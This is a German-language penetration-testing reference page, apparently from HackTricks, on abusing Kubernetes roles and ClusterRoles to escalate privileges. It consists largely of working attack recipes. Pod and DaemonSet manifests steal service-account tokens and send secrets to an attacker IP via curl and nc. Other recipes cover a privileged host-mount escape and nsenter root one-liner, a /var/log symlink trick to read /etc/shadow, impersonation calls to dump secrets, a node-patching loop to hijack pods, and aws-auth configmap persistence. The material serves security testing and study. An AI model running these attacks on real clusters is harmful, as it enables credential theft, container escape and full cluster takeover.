# Abusing Roles/ClusterRoles in Kubernetes

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

Hier finden Sie einige potenziell gef√§hrliche Rollen- und Clusterrollen-Konfigurationen.\
Denken Sie daran, dass Sie alle unterst√ºtzten Ressourcen mit `kubectl api-resources` abrufen k√∂nnen.

## **Privilegieneskalation**

Bezieht sich auf die Kunst, **Zugriff auf ein anderes Subjekt** innerhalb des Clusters **mit anderen Berechtigungen** (innerhalb des Kubernetes-Clusters oder zu externen Clouds) zu erhalten, als die, die Sie bereits haben. In Kubernetes gibt es im Wesentlichen **4 Haupttechniken zur Eskalation von Berechtigungen**:

* In der Lage sein, **sich als** andere Benutzer/Gruppen/SAs mit besseren Berechtigungen innerhalb des Kubernetes-Clusters oder zu externen Clouds **auszugeben**.
* In der Lage sein, **Pods zu erstellen/zu patchen/auszuf√ºhren**, in denen Sie **SAs mit besseren Berechtigungen** innerhalb des Kubernetes-Clusters oder zu externen Clouds **finden oder anh√§ngen** k√∂nnen.
* In der Lage sein, **Secrets zu lesen**, da die SAs-Token als Secrets gespeichert sind.
* In der Lage sein, **aus einem Container auf den Knoten zu entkommen**, wo Sie alle Secrets der auf dem Knoten laufenden Container, die Anmeldeinformationen des Knotens und die Berechtigungen des Knotens innerhalb der Cloud, in der er l√§uft (falls vorhanden), stehlen k√∂nnen.
* Eine f√ºnfte Technik, die erw√§hnt werden sollte, ist die F√§higkeit, **Port-Forwarding** in einem Pod auszuf√ºhren, da Sie m√∂glicherweise auf interessante Ressourcen innerhalb dieses Pods zugreifen k√∂nnen.

### Zugriff auf jede Ressource oder Verb (Wildcard)

Die **Wildcard (\*) gew√§hrt Berechtigungen f√ºr jede Ressource mit jedem Verb**. Sie wird von Administratoren verwendet. Innerhalb einer ClusterRole bedeutet dies, dass ein Angreifer jede Namespace im Cluster missbrauchen k√∂nnte.
```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
name: api-resource-verbs-all
rules:
rules:
- apiGroups: ["*"]
resources: ["*"]
verbs: ["*"]
```
### Zugriff auf jede Ressource mit einem bestimmten Verb

In RBAC stellen bestimmte Berechtigungen erhebliche Risiken dar:

1. **`create`:** Gew√§hrt die M√∂glichkeit, jede Cluster-Ressource zu erstellen, was ein Risiko f√ºr die Privilegieneskalation darstellt.
2. **`list`:** Erm√∂glicht das Auflisten aller Ressourcen, was potenziell sensible Daten leaken k√∂nnte.
3. **`get`:** Erlaubt den Zugriff auf Geheimnisse von Dienstkonten, was eine Sicherheitsbedrohung darstellt.
```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
name: api-resource-verbs-all
rules:
rules:
- apiGroups: ["*"]
resources: ["*"]
verbs: ["create", "list", "get"]
```
### Pod erstellen - Token stehlen

Ein Angreifer mit den Berechtigungen zum Erstellen eines Pods k√∂nnte ein privilegiertes Service-Konto in den Pod anh√§ngen und das Token stehlen, um das Service-Konto zu impersonieren. Dadurch werden die Berechtigungen effektiv erh√∂ht.

Beispiel eines Pods, der das Token des `bootstrap-signer` Service-Kontos stehlen und es an den Angreifer senden wird:
```yaml
apiVersion: v1
kind: Pod
metadata:
name: alpine
namespace: kube-system
spec:
containers:
- name: alpine
image: alpine
command: ["/bin/sh"]
args: ["-c", 'apk update && apk add curl --no-cache; cat /run/secrets/kubernetes.io/serviceaccount/token | { read TOKEN; curl -k -v -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" https://192.168.154.228:8443/api/v1/namespaces/kube-system/secrets; } | nc -nv 192.168.154.228 6666; sleep 100000']
serviceAccountName: bootstrap-signer
automountServiceAccountToken: true
hostNetwork: true
```
### Pod Erstellen & Entkommen

Die folgenden Punkte zeigen alle Berechtigungen, die ein Container haben kann:

* **Privilegierter Zugriff** (Schutzma√ünahmen deaktivieren und Berechtigungen festlegen)
* **Deaktivieren von Namespaces hostIPC und hostPid**, die helfen k√∂nnen, Berechtigungen zu eskalieren
* **Deaktivieren des hostNetwork**-Namespaces, der Zugriff gew√§hrt, um die Cloud-Berechtigungen der Knoten zu stehlen und besseren Zugang zu Netzwerken zu erhalten
* **Mounten von Hosts / innerhalb des Containers**

{% code title="super_privs.yaml" %}
```yaml
apiVersion: v1
kind: Pod
metadata:
name: ubuntu
labels:
app: ubuntu
spec:
# Uncomment and specify a specific node you want to debug
# nodeName: <insert-node-name-here>
containers:
- image: ubuntu
command:
- "sleep"
- "3600" # adjust this as needed -- use only as long as you need
imagePullPolicy: IfNotPresent
name: ubuntu
securityContext:
allowPrivilegeEscalation: true
privileged: true
#capabilities:
#  add: ["NET_ADMIN", "SYS_ADMIN"] # add the capabilities you need https://man7.org/linux/man-pages/man7/capabilities.7.html
runAsUser: 0 # run as root (or any other user)
volumeMounts:
- mountPath: /host
name: host-volume
restartPolicy: Never # we want to be intentional about running this pod
hostIPC: true # Use the host's ipc namespace https://www.man7.org/linux/man-pages/man7/ipc_namespaces.7.html
hostNetwork: true # Use the host's network namespace https://www.man7.org/linux/man-pages/man7/network_namespaces.7.html
hostPID: true # Use the host's pid namespace https://man7.org/linux/man-pages/man7/pid_namespaces.7.htmlpe_
volumes:
- name: host-volume
hostPath:
path: /
```
{% endcode %}

Erstellen Sie das Pod mit:
```bash
kubectl --token $token create -f mount_root.yaml
```
Einzeiler aus [diesem Tweet](https://twitter.com/mauilion/status/1129468485480751104) und mit einigen Erg√§nzungen:
```bash
kubectl run r00t --restart=Never -ti --rm --image lol --overrides '{"spec":{"hostPID": true, "containers":[{"name":"1","image":"alpine","command":["nsenter","--mount=/proc/1/ns/mnt","--","/bin/bash"],"stdin": true,"tty":true,"imagePullPolicy":"IfNotPresent","securityContext":{"privileged":true}}]}}'
```
Jetzt, da Sie zum Knoten entkommen k√∂nnen, √ºberpr√ºfen Sie die Post-Exploitation-Techniken in:

#### Stealth

Sie m√∂chten wahrscheinlich **stealthier** sein. Auf den folgenden Seiten k√∂nnen Sie sehen, auf was Sie zugreifen k√∂nnten, wenn Sie ein Pod erstellen, das nur einige der in der vorherigen Vorlage genannten Berechtigungen aktiviert:

* **Privileged + hostPID**
* **Privileged only**
* **hostPath**
* **hostPID**
* **hostNetwork**
* **hostIPC**

_Sie finden Beispiele daf√ºr, wie Sie die vorherigen privilegierten Pod-Konfigurationen erstellen/ausnutzen k√∂nnen in_ [_https://github.com/BishopFox/badPods_](https://github.com/BishopFox/badPods)

### Pod erstellen - In die Cloud verschieben

Wenn Sie einen **Pod** (und optional ein **Service-Konto**) **erstellen** k√∂nnen, k√∂nnten Sie in der Lage sein, **Berechtigungen in der Cloud-Umgebung zu erhalten**, indem Sie **Cloud-Rollen einem Pod oder einem Service-Konto zuweisen** und dann darauf zugreifen.\
Dar√ºber hinaus, wenn Sie einen **Pod mit dem Host-Netzwerk-Namespace** erstellen k√∂nnen, k√∂nnen Sie die **IAM**-Rolle der **Knoten**-Instanz **stehlen**.

F√ºr weitere Informationen siehe:

{% content-ref url="pod-escape-privileges.md" %}
[pod-escape-privileges.md](pod-escape-privileges.md)
{% endcontent-ref %}

### **Deployment, Daemonsets, Statefulsets, Replicationcontrollers, Replicasets, Jobs und Cronjobs erstellen/patchen**

Es ist m√∂glich, diese Berechtigungen auszunutzen, um einen **neuen Pod** zu **erstellen** und Berechtigungen wie im vorherigen Beispiel zu erlangen.

Die folgende YAML **erstellt ein Daemonset und exfiltriert das Token des SA** innerhalb des Pods:
```yaml
apiVersion: apps/v1
kind: DaemonSet
metadata:
name: alpine
namespace: kube-system
spec:
selector:
matchLabels:
name: alpine
template:
metadata:
labels:
name: alpine
spec:
serviceAccountName: bootstrap-signer
automountServiceAccountToken: true
hostNetwork: true
containers:
- name: alpine
image: alpine
command: ["/bin/sh"]
args: ["-c", 'apk update && apk add curl --no-cache; cat /run/secrets/kubernetes.io/serviceaccount/token | { read TOKEN; curl -k -v -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" https://192.168.154.228:8443/api/v1/namespaces/kube-system/secrets; } | nc -nv 192.168.154.228 6666; sleep 100000']
volumeMounts:
- mountPath: /root
name: mount-node-root
volumes:
- name: mount-node-root
hostPath:
path: /
```
### **Pods Exec**

**`pods/exec`** ist eine Ressource in Kubernetes, die zum **Ausf√ºhren von Befehlen in einer Shell innerhalb eines Pods** verwendet wird. Dies erm√∂glicht es, **Befehle innerhalb der Container auszuf√ºhren oder eine Shell zu erhalten**.

Daher ist es m√∂glich, **in einen Pod zu gelangen und das Token des SA zu stehlen**, oder in einen privilegierten Pod einzutreten, zum Knoten zu entkommen und alle Tokens der Pods im Knoten zu stehlen und (ab)zu nutzen:
```bash
kubectl exec -it <POD_NAME> -n <NAMESPACE> -- sh
```
### port-forward

Diese Berechtigung erlaubt es, **einen lokalen Port an einen Port im angegebenen Pod weiterzuleiten**. Dies soll es erm√∂glichen, Anwendungen, die innerhalb eines Pods laufen, einfach zu debuggen, aber ein Angreifer k√∂nnte dies missbrauchen, um Zugang zu interessanten (wie DBs) oder anf√§lligen Anwendungen (Webs?) innerhalb eines Pods zu erhalten:
```
kubectl port-forward pod/mypod 5000:5000
```
### Hosts Writable /var/log/ Escape

Wie [**in dieser Forschung angegeben**](https://jackleadford.github.io/containers/2020/03/06/pvpost.html), wenn Sie auf ein Pod zugreifen oder ein Pod mit dem **hosts `/var/log/` Verzeichnis montiert** darauf erstellen k√∂nnen, k√∂nnen Sie **aus dem Container entkommen**.\
Das liegt im Wesentlichen daran, dass wenn die **Kube-API versucht, die Logs** eines Containers abzurufen (mit `kubectl logs <pod>`), sie die **`0.log`** Datei des Pods √ºber den `/logs/` Endpunkt des **Kubelet** Dienstes anfordert.\
Der Kubelet-Dienst exponiert den `/logs/` Endpunkt, der im Grunde genommen **das `/var/log` Dateisystem des Containers exponiert**.

Daher k√∂nnte ein Angreifer mit **Zugriff auf das Schreiben im /var/log/ Ordner** des Containers dieses Verhalten auf 2 Arten ausnutzen:

* √Ñndern der `0.log` Datei seines Containers (normalerweise zu finden in `/var/logs/pods/namespace_pod_uid/container/0.log`), um ein **Symlink zu `/etc/shadow`** zu sein, zum Beispiel. Dann k√∂nnen Sie die Schatten-Datei des Hosts exfiltrieren, indem Sie:
```bash
kubectl logs escaper
failed to get parse function: unsupported log format: "root::::::::\n"
kubectl logs escaper --tail=2
failed to get parse function: unsupported log format: "systemd-resolve:*:::::::\n"
# Keep incrementing tail to exfiltrate the whole file
```
* Wenn der Angreifer einen Principal mit den **Berechtigungen zum Lesen von `nodes/log`** kontrolliert, kann er einfach einen **symlink** in `/host-mounted/var/log/sym` zu `/` erstellen und beim **Zugriff auf `https://<gateway>:10250/logs/sym/` wird er das Root**-Dateisystem des Hosts auflisten (√Ñndern des symlinks kann Zugriff auf Dateien gew√§hren).
```bash
curl -k -H 'Authorization: Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6Im[...]' 'https://172.17.0.1:10250/logs/sym/'
<a href="bin">bin</a>
<a href="data/">data/</a>
<a href="dev/">dev/</a>
<a href="etc/">etc/</a>
<a href="home/">home/</a>
<a href="init">init</a>
<a href="lib">lib</a>
[...]
```
**Ein Labor und ein automatisierter Exploit sind zu finden unter** [**https://blog.aquasec.com/kubernetes-security-pod-escape-log-mounts**](https://blog.aquasec.com/kubernetes-security-pod-escape-log-mounts)

#### Umgehung des readOnly-Schutzes <a href="#bypassing-hostpath-readonly-protection" id="bypassing-hostpath-readonly-protection"></a>

Wenn Sie das Gl√ºck haben und die hochprivilegierte F√§higkeit `CAP_SYS_ADMIN` verf√ºgbar ist, k√∂nnen Sie den Ordner einfach als rw neu einh√§ngen:
```bash
mount -o rw,remount /hostlogs/
```
#### Bypassing hostPath readOnly protection <a href="#bypassing-hostpath-readonly-protection" id="bypassing-hostpath-readonly-protection"></a>

Wie in [**dieser Forschung**](https://jackleadford.github.io/containers/2020/03/06/pvpost.html) angegeben, ist es m√∂glich, den Schutz zu umgehen:
```yaml
allowedHostPaths:
- pathPrefix: "/foo"
readOnly: true
```
Was dazu gedacht war, Ausbr√ºche wie die vorherigen zu verhindern, indem anstelle eines hostPath-Mounts ein PersistentVolume und ein PersistentVolumeClaim verwendet werden, um einen Ordner des Hosts im Container mit schreibbarem Zugriff zu mounten:
```yaml
apiVersion: v1
kind: PersistentVolume
metadata:
name: task-pv-volume-vol
labels:
type: local
spec:
storageClassName: manual
capacity:
storage: 10Gi
accessModes:
- ReadWriteOnce
hostPath:
path: "/var/log"
---
apiVersion: v1
kind: PersistentVolumeClaim
metadata:
name: task-pv-claim-vol
spec:
storageClassName: manual
accessModes:
- ReadWriteOnce
resources:
requests:
storage: 3Gi
---
apiVersion: v1
kind: Pod
metadata:
name: task-pv-pod
spec:
volumes:
- name: task-pv-storage-vol
persistentVolumeClaim:
claimName: task-pv-claim-vol
containers:
- name: task-pv-container
image: ubuntu:latest
command: [ "sh", "-c", "sleep 1h" ]
volumeMounts:
- mountPath: "/hostlogs"
name: task-pv-storage-vol
```
### **Impersonation von privilegierten Konten**

Mit einem [**Benutzer-Impersonation**](https://kubernetes.io/docs/reference/access-authn-authz/authentication/#user-impersonation) Privileg k√∂nnte ein Angreifer ein privilegiertes Konto impersonieren.

Verwenden Sie einfach den Parameter `--as=<Benutzername>` im `kubectl` Befehl, um einen Benutzer zu impersonieren, oder `--as-group=<Gruppe>`, um eine Gruppe zu impersonieren:
```bash
kubectl get pods --as=system:serviceaccount:kube-system:default
kubectl get secrets --as=null --as-group=system:masters
```
Oder verwenden Sie die REST-API:
```bash
curl -k -v -XGET -H "Authorization: Bearer <JWT TOKEN (of the impersonator)>" \
-H "Impersonate-Group: system:masters"\
-H "Impersonate-User: null" \
-H "Accept: application/json" \
https://<master_ip>:<port>/api/v1/namespaces/kube-system/secrets/
```
### Auflisten von Geheimnissen

Die Berechtigung, **Geheimnisse aufzulisten, k√∂nnte einem Angreifer tats√§chlich erlauben, die Geheimnisse zu lesen**, indem er auf den REST-API-Endpunkt zugreift:
```bash
curl -v -H "Authorization: Bearer <jwt_token>" https://<master_ip>:<port>/api/v1/namespaces/kube-system/secrets/
```
### Lesen eines Geheimnisses ‚Äì Brute-Force von Token-IDs

W√§hrend ein Angreifer im Besitz eines Tokens mit Leseberechtigungen den genauen Namen des Geheimnisses ben√∂tigt, um es zu verwenden, gibt es im Gegensatz zu dem umfassenderen _**Geheimnisse auflisten**_ Privileg dennoch Schwachstellen. Standarddienstkonten im System k√∂nnen aufgelistet werden, wobei jedes mit einem Geheimnis verbunden ist. Diese Geheimnisse haben eine Namensstruktur: ein statisches Pr√§fix gefolgt von einem zuf√§lligen f√ºnfstelligen alphanumerischen Token (mit Ausnahme bestimmter Zeichen) gem√§√ü dem [Quellcode](https://github.com/kubernetes/kubernetes/blob/8418cccaf6a7307479f1dfeafb0d2823c1c37802/staging/src/k8s.io/apimachinery/pkg/util/rand/rand.go#L83).

Das Token wird aus einem begrenzten 27-Zeichen-Satz (`bcdfghjklmnpqrstvwxz2456789`) generiert, anstatt aus dem vollst√§ndigen alphanumerischen Bereich. Diese Einschr√§nkung reduziert die insgesamt m√∂glichen Kombinationen auf 14.348.907 (27^5). Folglich k√∂nnte ein Angreifer realistisch einen Brute-Force-Angriff durchf√ºhren, um das Token innerhalb weniger Stunden zu ermitteln, was m√∂glicherweise zu einer Privilegieneskalation durch den Zugriff auf sensible Dienstkonten f√ºhren k√∂nnte.

### Zertifikat-Signierungsanfragen

Wenn Sie die Verben **`create`** in der Ressource `certificatesigningrequests` (oder zumindest in `certificatesigningrequests/nodeClient`) haben. Sie k√∂nnen **ein neues CeSR eines** **neuen Knotens erstellen.**

Laut der [Dokumentation ist es m√∂glich, diese Anfragen automatisch zu genehmigen](https://kubernetes.io/docs/reference/command-line-tools-reference/kubelet-tls-bootstrapping/), sodass Sie in diesem Fall **keine zus√§tzlichen Berechtigungen ben√∂tigen**. Andernfalls m√ºssten Sie in der Lage sein, die Anfrage zu genehmigen, was bedeutet, dass Sie ein Update in `certificatesigningrequests/approval` und `approve` in `signers` mit resourceName `<signerNameDomain>/<signerNamePath>` oder `<signerNameDomain>/*` ben√∂tigen.

Ein **Beispiel f√ºr eine Rolle** mit allen erforderlichen Berechtigungen ist:
```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
name: csr-approver
rules:
- apiGroups:
- certificates.k8s.io
resources:
- certificatesigningrequests
verbs:
- get
- list
- watch
- create
- apiGroups:
- certificates.k8s.io
resources:
- certificatesigningrequests/approval
verbs:
- update
- apiGroups:
- certificates.k8s.io
resources:
- signers
resourceNames:
- example.com/my-signer-name # example.com/* can be used to authorize for all signers in the 'example.com' domain
verbs:
- approve
```
So, mit dem genehmigten neuen Node CSR kannst du die **besonderen Berechtigungen** von Knoten **ausnutzen**, um **Geheimnisse zu stehlen** und **Berechtigungen zu eskalieren**.

In [**diesem Beitrag**](https://www.4armed.com/blog/hacking-kubelet-on-gke/) und [**diesem hier**](https://rhinosecuritylabs.com/cloud-security/kubelet-tls-bootstrap-privilege-escalation/) ist die GKE K8s TLS Bootstrap-Konfiguration mit **automatischer Signierung** konfiguriert und wird ausgenutzt, um Anmeldeinformationen eines neuen K8s-Knotens zu generieren und diese dann zu missbrauchen, um Berechtigungen durch das Stehlen von Geheimnissen zu eskalieren.\
Wenn du **die genannten Berechtigungen hast, k√∂nntest du dasselbe tun**. Beachte, dass das erste Beispiel den Fehler umgeht, der einen neuen Knoten daran hindert, auf Geheimnisse innerhalb von Containern zuzugreifen, da ein **Knoten nur auf die Geheimnisse von Containern zugreifen kann, die auf ihm gemountet sind.**

Der Weg, dies zu umgehen, besteht einfach darin, **Anmeldeinformationen f√ºr den Knotennamen zu erstellen, unter dem der Container mit den interessanten Geheimnissen gemountet ist** (aber schau dir einfach an, wie man es im ersten Beitrag macht):
```bash
"/O=system:nodes/CN=system:node:gke-cluster19-default-pool-6c73b1-8cj1"
```
### AWS EKS aws-auth configmaps

Prinzipien, die **`configmaps`** im kube-system Namespace auf EKS (m√ºssen in AWS sein) Clustern √§ndern k√∂nnen, k√∂nnen Cluster-Admin-Rechte erlangen, indem sie die **aws-auth** configmap √ºberschreiben.\
Die ben√∂tigten Verben sind **`update`** und **`patch`**, oder **`create`**, wenn die configmap nicht erstellt wurde:

{% code overflow="wrap" %}
```bash
# Check if config map exists
get configmap aws-auth -n kube-system -o yaml

## Yaml example
apiVersion: v1
kind: ConfigMap
metadata:
name: aws-auth
namespace: kube-system
data:
mapRoles: |
- rolearn: arn:aws:iam::123456789098:role/SomeRoleTestName
username: system:node:{{EC2PrivateDNSName}}
groups:
- system:masters

# Create donfig map is doesn't exist
## Using kubectl and the previous yaml
kubectl apply -f /tmp/aws-auth.yaml
## Using eksctl
eksctl create iamidentitymapping --cluster Testing --region us-east-1 --arn arn:aws:iam::123456789098:role/SomeRoleTestName --group "system:masters" --no-duplicate-arns

# Modify it
kubectl edit -n kube-system configmap/aws-auth
## You can modify it to even give access to users from other accounts
data:
mapRoles: |
- rolearn: arn:aws:iam::123456789098:role/SomeRoleTestName
username: system:node:{{EC2PrivateDNSName}}
groups:
- system:masters
mapUsers: |
- userarn: arn:aws:iam::098765432123:user/SomeUserTestName
username: admin
groups:
- system:masters
```
{% endcode %}

{% hint style="warning" %}
Sie k√∂nnen **`aws-auth`** f√ºr **Persistenz** verwenden, um Benutzern aus **anderen Konten** Zugriff zu gew√§hren.

Allerdings funktioniert `aws --profile other_account eks update-kubeconfig --name <cluster-name>` **nicht von einem anderen Konto**. Aber tats√§chlich funktioniert `aws --profile other_account eks get-token --cluster-name arn:aws:eks:us-east-1:123456789098:cluster/Testing`, wenn Sie die ARN des Clusters anstelle nur des Namens angeben.\
Um `kubectl` zum Laufen zu bringen, stellen Sie einfach sicher, dass Sie die **kubeconfig des Opfers** **konfigurieren** und in den aws exec-Argumenten `--profile other_account_role` hinzuf√ºgen, damit kubectl das Profil des anderen Kontos verwendet, um das Token zu erhalten und AWS zu kontaktieren.
{% endhint %}

### Eskalation in GKE

Es gibt **2 M√∂glichkeiten, K8s-Berechtigungen GCP-Prinzipien zuzuweisen**. In jedem Fall ben√∂tigt das Prinzip auch die Berechtigung **`container.clusters.get`**, um Anmeldeinformationen zum Zugriff auf den Cluster zu sammeln, oder Sie m√ºssen **Ihre eigene kubectl-Konfigurationsdatei generieren** (folgen Sie dem n√§chsten Link).

{% hint style="warning" %}
Wenn Sie mit dem K8s-API-Endpunkt sprechen, wird das **GCP-Auth-Token gesendet**. Dann wird GCP √ºber den K8s-API-Endpunkt zuerst **√ºberpr√ºfen, ob das Prinzip** (per E-Mail) **Zugriff innerhalb des Clusters hat**, dann wird √ºberpr√ºft, ob es **irgendwelchen Zugriff √ºber GCP IAM** hat.\
Wenn **irgendeine** dieser Bedingungen **wahr** ist, wird er **antworten**. Wenn **nicht**, wird ein **Fehler** angezeigt, der vorschl√§gt, **Berechtigungen √ºber GCP IAM** zu gew√§hren.
{% endhint %}

Dann ist die erste Methode die Verwendung von **GCP IAM**, die K8s-Berechtigungen haben ihre **entsprechenden GCP IAM-Berechtigungen**, und wenn das Prinzip diese hat, kann es sie verwenden.

{% content-ref url="../../gcp-security/gcp-privilege-escalation/gcp-container-privesc.md" %}
[gcp-container-privesc.md](../../gcp-security/gcp-privilege-escalation/gcp-container-privesc.md)
{% endcontent-ref %}

Die zweite Methode besteht darin, **K8s-Berechtigungen innerhalb des Clusters** zuzuweisen, indem der Benutzer √ºber seine **E-Mail** identifiziert wird (einschlie√ülich GCP-Dienstkonten).

### Erstellen von Serviceaccounts-Token

Prinzipien, die **TokenRequests** (`serviceaccounts/token`) erstellen k√∂nnen, wenn sie mit dem K8s-API-Endpunkt sprechen SAs (Informationen von [**hier**](https://github.com/PaloAltoNetworks/rbac-police/blob/main/lib/token_request.rego)).

### ephemeralcontainers

Prinzipien, die **`update`** oder **`patch`** **`pods/ephemeralcontainers`** k√∂nnen **Codeausf√ºhrung auf anderen Pods** erlangen und potenziell **ausbrechen** zu ihrem Knoten, indem sie einen ephemeral container mit einem privilegierten securityContext hinzuf√ºgen.

### ValidatingWebhookConfigurations oder MutatingWebhookConfigurations

Prinzipien mit einem der Verben `create`, `update` oder `patch` √ºber `validatingwebhookconfigurations` oder `mutatingwebhookconfigurations` k√∂nnten in der Lage sein, **eine solche webhookconfiguration zu erstellen**, um **Berechtigungen zu eskalieren**.

F√ºr ein [`mutatingwebhookconfigurations` Beispiel √ºberpr√ºfen Sie diesen Abschnitt dieses Beitrags](./#malicious-admission-controller).

### Eskalieren

Wie Sie im n√§chsten Abschnitt lesen k√∂nnen: [**Integrierte Pr√§vention der privilegierten Eskalation**](./#built-in-privileged-escalation-prevention), kann ein Prinzip keine Rollen oder Clusterrollen aktualisieren oder erstellen, ohne selbst diese neuen Berechtigungen zu haben. Es sei denn, es hat das **Verb `escalate`** √ºber **`roles`** oder **`clusterroles`**.\
Dann kann er neue Rollen, Clusterrollen mit besseren Berechtigungen als die, die er hat, aktualisieren/erstellen.

### Nodes-Proxy

Prinzipien mit Zugriff auf die **`nodes/proxy`** Unterressource k√∂nnen **Code auf Pods ausf√ºhren** √ºber die Kubelet-API (laut [**diesem**](https://github.com/PaloAltoNetworks/rbac-police/blob/main/lib/nodes_proxy.rego)). Weitere Informationen zur Kubelet-Authentifizierung finden Sie auf dieser Seite:

{% content-ref url="../pentesting-kubernetes-services/kubelet-authentication-and-authorization.md" %}
[kubelet-authentication-and-authorization.md](../pentesting-kubernetes-services/kubelet-authentication-and-authorization.md)
{% endcontent-ref %}

Sie haben ein Beispiel, wie Sie [**RCE erhalten, indem Sie autorisiert mit einer Kubelet-API sprechen**](../pentesting-kubernetes-services/#kubelet-rce).

### Pods l√∂schen + nicht planbare Knoten

Prinzipien, die **Pods l√∂schen** k√∂nnen (`delete` Verb √ºber `pods` Ressource), oder **Pods evakuieren** (`create` Verb √ºber `pods/eviction` Ressource), oder **Pod-Status √§ndern** (Zugriff auf `pods/status`) und k√∂nnen **andere Knoten nicht planbar machen** (Zugriff auf `nodes/status`) oder **Knoten l√∂schen** (`delete` Verb √ºber `nodes` Ressource) und Kontrolle √ºber einen Pod haben, k√∂nnten **Pods von anderen Knoten stehlen**, sodass sie in dem **kompromittierten** **Knoten** **ausgef√ºhrt** werden und der Angreifer die **Tokens** von diesen Pods **stehlen** kann.

{% code overflow="wrap" %}
```bash
patch_node_capacity(){
curl -s -X PATCH 127.0.0.1:8001/api/v1/nodes/$1/status -H "Content-Type: json-patch+json" -d '[{"op": "replace", "path":"/status/allocatable/pods", "value": "0"}]'
}

while true; do patch_node_capacity <id_other_node>; done &
#Launch previous line with all the nodes you need to attack

kubectl delete pods -n kube-system <privileged_pod_name>
```
{% endcode %}

### Dienste-Status (CVE-2020-8554)

Prinzipien, die **`services/status`** **√§ndern** k√∂nnen, d√ºrfen das Feld `status.loadBalancer.ingress.ip` setzen, um die **nicht behobene CVE-2020-8554** auszunutzen und **MiTM-Angriffe gegen den Cluster** zu starten. Die meisten Milderungen f√ºr CVE-2020-8554 verhindern nur ExternalIP-Dienste (laut [**diesem**](https://github.com/PaloAltoNetworks/rbac-police/blob/main/lib/modify\_service\_status\_cve\_2020\_8554.rego)).

### Knoten- und Pod-Status

Prinzipien mit **`update`** oder **`patch`** Berechtigungen √ºber `nodes/status` oder `pods/status` k√∂nnten Labels √§ndern, um die durchgesetzten Planungsbeschr√§nkungen zu beeinflussen.

## Eingebaute Verhinderung von Privilegieneskalation

Kubernetes hat einen [eingebauten Mechanismus](https://kubernetes.io/docs/reference/access-authn-authz/rbac/#privilege-escalation-prevention-and-bootstrapping) zur Verhinderung von Privilegieneskalation.

Dieses System stellt sicher, dass **Benutzer ihre Berechtigungen nicht erh√∂hen k√∂nnen, indem sie Rollen oder Rollenzuweisungen √§ndern**. Die Durchsetzung dieser Regel erfolgt auf API-Ebene und bietet einen Schutz, selbst wenn der RBAC-Autorisierer inaktiv ist.

Die Regel besagt, dass ein **Benutzer eine Rolle nur erstellen oder aktualisieren kann, wenn er alle Berechtigungen besitzt, die die Rolle umfasst**. Dar√ºber hinaus muss der Umfang der bestehenden Berechtigungen des Benutzers mit dem der Rolle √ºbereinstimmen, die er zu erstellen oder zu √§ndern versucht: entweder clusterweit f√ºr ClusterRoles oder auf denselben Namespace (oder clusterweit) f√ºr Roles beschr√§nkt.

{% hint style="warning" %}
Es gibt eine Ausnahme von der vorherigen Regel. Wenn ein Prinzipal das **Verb `escalate`** √ºber **`roles`** oder **`clusterroles`** hat, kann er die Berechtigungen von Rollen und Clusterrollen erh√∂hen, auch ohne die Berechtigungen selbst zu besitzen.
{% endhint %}

### **Get & Patch RoleBindings/ClusterRoleBindings**

{% hint style="danger" %}
**Offensichtlich hat diese Technik fr√ºher funktioniert, aber laut meinen Tests funktioniert sie aus dem gleichen Grund wie im vorherigen Abschnitt nicht mehr. Du kannst kein Rolebinding erstellen/√§ndern, um dir selbst oder einem anderen SA einige Berechtigungen zu geben, wenn du sie nicht bereits hast.**
{% endhint %}

Das Privileg, Rolebindings zu erstellen, erm√∂glicht es einem Benutzer, **Rollen an ein Dienstkonto zu binden**. Dieses Privileg kann potenziell zu einer Privilegieneskalation f√ºhren, da es **dem Benutzer erlaubt, Administratorberechtigungen an ein kompromittiertes Dienstkonto zu binden.**

## Andere Angriffe

### Sidecar-Proxy-App

Standardm√§√üig gibt es keine Verschl√ºsselung in der Kommunikation zwischen Pods. Gegenseitige Authentifizierung, bidirektional, Pod zu Pod.

#### Erstelle eine Sidecar-Proxy-App <a href="#create-a-sidecar-proxy-app" id="create-a-sidecar-proxy-app"></a>

Erstelle deine .yaml
```bash
kubectl run app --image=bash --command -oyaml --dry-run=client > <appName.yaml> -- sh -c 'ping google.com'
```
Bearbeiten Sie Ihre .yaml und f√ºgen Sie die auskommentierten Zeilen hinzu:
```yaml
#apiVersion: v1
#kind: Pod
#metadata:
#  name: security-context-demo
#spec:
#  securityContext:
#    runAsUser: 1000
#    runAsGroup: 3000
#    fsGroup: 2000
#  volumes:
#  - name: sec-ctx-vol
#    emptyDir: {}
#  containers:
#  - name: sec-ctx-demo
#    image: busybox
command: [ "sh", "-c", "apt update && apt install iptables -y && iptables -L && sleep 1h" ]
securityContext:
capabilities:
add: ["NET_ADMIN"]
#   volumeMounts:
#   - name: sec-ctx-vol
#     mountPath: /data/demo
#   securityContext:
#     allowPrivilegeEscalation: true
```
Siehe die Protokolle des Proxys:
```bash
kubectl logs app -C proxy
```
Mehr Informationen unter: [https://kubernetes.io/docs/tasks/configure-pod-container/security-context/](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)

### B√∂sartiger Admission Controller

